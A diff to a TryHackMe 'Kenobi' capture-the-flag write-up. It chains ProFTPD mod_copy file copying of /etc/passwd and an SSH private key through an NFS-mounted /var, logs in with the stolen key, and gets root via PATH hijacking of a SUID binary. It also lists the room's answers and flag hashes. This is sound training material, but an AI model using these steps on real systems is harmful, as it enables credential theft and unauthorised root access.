@@ -1,16 +1,13 @@
-# Writeup for the Try_Hack_Me box - Kenobi. 
+# Writeup for the Try_Hack_Me box - [Kenobi](https://tryhackme.com/room/kenobi). 
 
-The box utilizes **Samba share** for enumeration and get on the box. <ADD details about the privesc>
+The box utilizes **Samba share** for enumeration and get on the box. Priv Esc is through a SUID binary on an unknown binary.
  
 > Pratyush Prakhar (5#1NC#4N) - 08/11/2023
 
-# RECON
+## RECON
 
 1. Scan the machine with nmap, how many ports are open? - **7**
 
-```bash
-nmap -vv -sC -sV -oN nmap/main 10.10.224.128
-```
 **Output**
 
 ```bash
@@ -96,14 +93,15 @@ Host script results:
 
 3. Let's try to actively enumerate the path to gain more information.
 
-# FTP
+## FTP
 
 1. FTP is a basic file transfer protocol which allows to host a part of file system for access. 
 2. For access, one might need `credentials` for acess. This provides a part for `fuzzing attacks` but might be caught by access logging mechanisms ont he system. Thus, a risk to follow this attack path. 
 3. In this case, we have the `ProFTPD 1.3.5` which has password protection.
 4. Let's look into any exploit that might be possible using `searchsploit` 
    1. Both `mod_copy` exploit fail due to non-writable paths.
-5. Let's move on to next options. We can use it once we have some credentials.
+   2. But the [text file]() here explains that we can use `CPFR` and `CPTO` commands on this version to copy file around the system. This can be exploited if we have some access to the file system to read or view and better execute.
+ 5. Let's move on to next options. We can use it once we have some credentials or the second path.
 
 **Output**
 
@@ -136,14 +134,8 @@ Papers: No Results
                     
 ```
 
-# SSH
 
-1. The system has OpenSSH installed which requires login by a valid user on the allowlist.,
-2. We can fuzz with tools like `hydra` and `wfuzz` but is a high resistance task. 
-3. We can get foothold with a set of valid credentials.
-
-
-# SMB
+## SMB
 
 1. Samba is installed on the system which is a file system protocol. This is for Windows what FTP is for linux with additional features.
 2. Let's explore the SMB shares that might be available to us.
@@ -191,8 +183,273 @@ s  .                                   D        0  Wed Sep  4 06:49:09 2019
 6. But there is no direct path to get foothold. Let's move to the next path.
 
 
-# NFS
- <Working on it>
+## NFS
+
+1. This is a file system protocol open on port 111. This allows a client ot mount a portion of the server file system on the local machine and interact with it in the given permissions set.
+
+2. Let's check for any mountable directories open on our server using `showmount`. We can the use the mountable directory to our local system using `mount` and the exports. Found a very simple process to follow here in this [blog](https://resources.infosecinstitute.com/topics/penetration-testing/exploiting-nfs-share/)
+
+**Output**
+
+```bash
+$ showmount --exports 10.10.252.139
+Export list for 10.10.252.139:
+/var *
+                                                                                 
+$ mkdir var           
+                                                                                 
+$ sudo mount -t nfs 
+                                                                                 
+$ sudo mount -t nfs 10.10.252.139:/var ./var 
+[sudo] password for kali: 
+                                                                                 
+$ ls -la ./var 
+total 56
+drwxr-xr-x 14 root root  4096 Sep  4  2019 .
+drwxr-xr-x  3 kali kali  4096 Aug 13 19:00 ..
+drwxr-xr-x  2 root root  4096 Sep  4  2019 backups
+drwxr-xr-x  9 root root  4096 Sep  4  2019 cache
+drwxrwxrwt  2 root root  4096 Sep  4  2019 crash
+drwxr-xr-x 40 root root  4096 Sep  4  2019 lib
+drwxrwsr-x  2 root staff 4096 Apr 12  2016 local
+lrwxrwxrwx  1 root root     9 Sep  4  2019 lock -> /run/lock
+drwxrwxr-x 10 root _ssh  4096 Sep  4  2019 log
+drwxrwsr-x  2 root mail  4096 Feb 26  2019 mail
+drwxr-xr-x  2 root root  4096 Feb 26  2019 opt
+lrwxrwxrwx  1 root root     4 Sep  4  2019 run -> /run
+drwxr-xr-x  2 root root  4096 Jan 29  2019 snap
+drwxr-xr-x  5 root root  4096 Sep  4  2019 spool
+drwxrwxrwt  6 root root  4096 Aug 13 18:40 tmp
+drwxr-xr-x  3 root root  4096 Sep  4  2019 www
+```
+
+3. We find that the `/var` dir of the server is mountable and we can read file from the system. 
+
+4. And now we have a path inside by combining the copy files exploit [here]() and the read here through var directory. 
+
+
+## INITIAL ACCESS
+
+1. Let's use the FTP exploit to get read on the common files.
+   1. We found that there are only two users with login on the system - `root` & `kenobi`. 
+   2. Let's try to find common files in `/home/kenobi` and try to obtain ssh keys.
+
+**Output**
+
+```bash
+$ ftp 10.10.252.139
+Connected to 10.10.252.139.
+220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.252.139]
+Name (10.10.252.139:kali): anonymous
+331 Anonymous login ok, send your complete email address as your password
+Password: 
+530 Login incorrect.
+ftp: Login failed
+ftp> site cpfr /etc/passwd
+350 File or directory exists, ready for destination name
+ftp> site cpto /var/tmp/passwd
+250 Copy successful                                                              
+ftp> site cpfr /home/kenobi/user.txt
+350 File or directory exists, ready for destination name
+ftp> site cpto /var/tmp/user.txt
+250 Copy successful
+ftp> site cpfr /home/kenobi/.ssh/id_rsa
+350 File or directory exists, ready for destination name
+ftp> site cpto /var/tmp/kenobi_id_rsa
+250 Copy successful
+ftp> 
+zsh: suspended  ftp 10.10.252.139
+```
+
+```bash
+$ cat passwd | grep bash
+root:x:0:0:root:/root:/bin/bash
+kenobi:x:1000:1000:kenobi,,,:/home/kenobi:/bin/bash
+                                                                                 
+$ chmod 600 kenobi_id_rsa
+                                                                                 
+$ ssh -i kenobi_id_rsa kenobi@10.10.252.139 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+103 packages can be updated.
+65 updates are security updates.
+
+
+Last login: Sun Aug 13 17:42:38 2023 from 10.13.5.5
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+```
+
+2. We can now use SSH to get on the system with the kenobi's SSH private key.
+
+
+## SSH
+
+1. The system has OpenSSH installed which requires login by a valid user on the allowlist.,
+2. We can fuzz with tools like `hydra` and `wfuzz` but is a high resistance task. 
+3. We can get foothold with a set of valid credentials or SSH key. Getting on the system using kenobi's private key.
+
+
+## PRIVESC
+
+1. We get on the system and run the `linpeas.sh` script to get all the useful information on the system.
+2. We find that there is a `SUID` privesc set on an unknown binary as `/usr/bin/menu` which has permission set as `root`.
+
+
+**Output**
+
+```bash
+..............................................
+
+-rw-r--r-- 1 root root 655 May 16  2017 /etc/skel/.profile
+-rw-r--r-- 1 kenobi kenobi 655 Sep  4  2019 /home/kenobi/.profile
+
+
+
+
+
+
+                      ╔════════════════════════════════════╗
+══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                                                                           
+                      ╚════════════════════════════════════╝                                                                                                                                 
+╔══════════╣ SUID - Check easy privesc, exploits and write perms
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                             
+strace Not Found                                                                                                                                                                             
+-rwsr-xr-x 1 root root 93K May  8  2019 /sbin/mount.nfs                                                                                                                                      
+-rwsr-xr-x 1 root root 15K Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1
+-rwsr-xr-- 1 root messagebus 42K Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-sr-x 1 root root 97K Jan 29  2019 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
+-rwsr-xr-x 1 root root 10K Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root 419K Jan 31  2019 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 39K Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+-rwsr-xr-x 1 root root 49K May 16  2017 /usr/bin/chfn  --->  SuSE_9.3/10
+-rwsr-xr-x 1 root root 33K May 16  2017 /usr/bin/newgidmap
+-rwsr-xr-x 1 root root 23K Jan 15  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
+-rwsr-xr-x 1 root root 53K May 16  2017 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+-rwsr-xr-x 1 root root 33K May 16  2017 /usr/bin/newuidmap
+-rwsr-xr-x 1 root root 74K May 16  2017 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 8.7K Sep  4  2019 /usr/bin/menu (Unknown SUID binary!)
+-rwsr-xr-x 1 root root 134K Jul  4  2017 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
+-rwsr-xr-x 1 root root 40K May 16  2017 /usr/bin/chsh
+-rwsr-sr-x 1 daemon daemon 51K Jan 14  2016 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
+-rwsr-xr-x 1 root root 39K May 16  2017 /usr/bin/newgrp  --->  HP-UX_10.20
+-rwsr-xr-x 1 root root 27K May 16  2018 /bin/umount  --->  BSD/Linux(08-1996)
+-rwsr-xr-x 1 root root 31K Jul 12  2016 /bin/fusermount
+-rwsr-xr-x 1 root root 40K May 16  2018 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+-rwsr-xr-x 1 root root 44K May  7  2014 /bin/ping
+-rwsr-xr-x 1 root root 40K May 16  2017 /bin/su
+-rwsr-xr-x 1 root root 44K May  7  2014 /bin/ping6
+...............................................................
+```
+
+3. Digging through the menu binary, one can find that for each options there are several default binaries run. We can exploit the `PATH` variable to inject malicious binaries to run them as part of the script. In this case, I am going with `curl` command. You can use the other two as well.
+
+```bash
+kenobi@kenobi:/usr/bin$ ./menu
+
+***************************************
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice :1
+HTTP/1.1 200 OK
+Date: Sun, 13 Aug 2023 23:38:46 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Last-Modified: Wed, 04 Sep 2019 09:07:20 GMT
+ETag: "c8-591b6884b6ed2"
+Accept-Ranges: bytes
+Content-Length: 200
+Vary: Accept-Encoding
+Content-Type: text/html
+
+kenobi@kenobi:/usr/bin$ strings menu 
+/lib64/ld-linux-x86-64.so.2
+libc.so.6
+setuid
+__isoc99_scanf
+puts
+__stack_chk_fail
+printf
+system
+__libc_start_main
+__gmon_start__
+GLIBC_2.7
+GLIBC_2.4
+GLIBC_2.2.5
+UH-`
+AWAVA
+AUATL
+[]A\A]A^A_
+***************************************
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice :
+curl -I localhost
+uname -r
+ifconfig
+ Invalid choice
+```
+
+4. We can use the following explaination to replace the curl binary in the menu with `bash` binary and run it with permissions of the root when invoked.
+
+```bash
+kenobi@kenobi:/tmp$ echo "/bin/bash" > curl 
+kenobi@kenobi:/tmp$ cat curl 
+/bin/bash
+kenobi@kenobi:/tmp$ echo $PATH
+/home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
+kenobi@kenobi:/tmp$ echo $PATH
+/tmp:/home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+kenobi@kenobi:/tmp$ /usr/bin/menu 
+
+***************************************
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice :1
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+root@kenobi:/tmp# whoami
+root
+root@kenobi:/tmp# cat /root/root.txt
+*********************************************** 
+```
+
+5. The box is pawned!! We can use this to get full hold of the system.
+   1. Got the [shadow file]() and can be used to crack passwords with `john` with [hashes]() file.
+
+
+## Answers to complete the box
+
+1. NMAP
+   1. Scan the machine with nmap, how many ports are open? - **7**
+
+2. SMB
+   1. how many shares have been found? - **3**
+   2. Once you're connected, list the files on the share. What is the file can you see? - **log.txt**
+
+3. FTP
+   1. What port is FTP running on? - **21**
+   2. What is the version of ProFTPD? - **1.3.5**
+   3. How many exploits are there for the ProFTPd running? - **4**
+
+4. NFS
+   1. What mount can we see? - **/var**
+
+5. PrivEsc
+   1. What file looks particularly out of the ordinary? - **/usr/bin/menu**
+   2. Run the binary, how many options appear? - **3**
+
+6. Flags
+   1. What is Kenobi's user flag (/home/kenobi/user.txt)? - **d0b0f3f53b6caa532a83915e19224899**
+   2. What is the root flag (/root/root.txt)? - **177b3cd8562289f37382721c28381f02**
 
 
 **Stay Tuned On**\
